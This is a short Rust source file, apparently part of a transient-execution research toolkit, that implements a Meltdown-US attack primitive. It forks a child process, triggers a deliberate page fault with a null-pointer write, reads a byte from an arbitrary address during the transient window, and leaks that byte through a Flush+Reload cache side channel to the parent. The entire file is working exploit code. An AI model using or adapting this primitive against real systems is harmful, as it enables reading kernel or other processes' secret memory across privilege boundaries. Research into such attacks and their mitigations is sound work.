use crate::fr::FlushReload;
use nix::sys::wait::waitpid;
use nix::unistd::{fork, ForkResult};

pub struct MeltdownUS {
    channel: FlushReload,
}

impl MeltdownUS {
    pub fn new() -> MeltdownUS {
        MeltdownUS {
            channel: FlushReload::new(),
        }
    }

    #[inline(always)]
    fn cause_transient_window() {
        unsafe {
            core::ptr::write_volatile(std::ptr::null_mut(), 42);
        }
    }

    pub fn read(&self, addr: *const u8) -> Option<u8> {
        match unsafe { fork() } {
            Ok(ForkResult::Child) => {
                self.channel.reset();

                MeltdownUS::cause_transient_window(); // Will raise page fault
                let secret = unsafe { *addr };
                self.channel.leak_without_prev_reset(secret);

                std::process::exit(0);
            }
            Ok(ForkResult::Parent { child }) => {
                let _ = waitpid(child, None);
                self.channel.get()
            }
            Err(_) => None,
        }
    }
}
